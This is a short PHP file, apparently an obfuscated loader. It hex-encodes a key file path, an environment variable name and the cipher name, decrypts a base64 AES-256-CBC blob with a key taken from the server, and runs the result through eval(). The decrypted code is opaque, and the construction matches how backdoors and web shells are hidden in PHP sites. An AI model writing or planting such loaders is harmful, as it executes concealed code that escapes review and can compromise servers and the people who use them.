<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('2Q9WZaaG+Q6cUMCvtTysnQ==');

$c=base64_decode(

'hRxie2IrNRcm+Sn7aQ0Q8ThAzMbJW549SSEw+z4xO6EIDnUkQyscMqYkH2hy63u6OKeGjJnbnL3C' .
'AdHUzCnrWDLddt2IUuRw5wg2NYu5BNt+ukynn3vHg3jT1H370WYD8tW0YmQBPgoA0ZBALs9cbF39' .
'qqS0hvxdFUOvesHKMrlqeerwIaBklc+3xA83QQixthUOKZI68O+NtKtFDEVbRWQp7Z3DpOGBXOMW' .
'PC6mp2pb8fhsguNAAvHsL6OvVmZ/tUhI4i92+sd8o93mDY3vBOwuGFC9sE6vETUj46oO/nXTFvcc' .
'Np/qNUnaHmo+9aSJGc6GQxJxYCP+tLEkWBIwpg8FdhfzqQYKgSeA47w/+qEjnCRogSV/2jeKpRgs' .
'LSFDVHXk8SFTyKTMKQA5DdLb1uvrKs9Mga0CHlRDI16rISgFaK+vSe4owLLUzOgKnjhIP9EApZxd' .
'U9Ef+QOBuow+JTUrIntLmb2wszrqxfXy2nYBkftNGmt8AC94eKyLAcbcUiRjNc8BAD+lTXUJgfiy' .
'oUe7u7Nf0nKhtN5rcJKZWYY='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

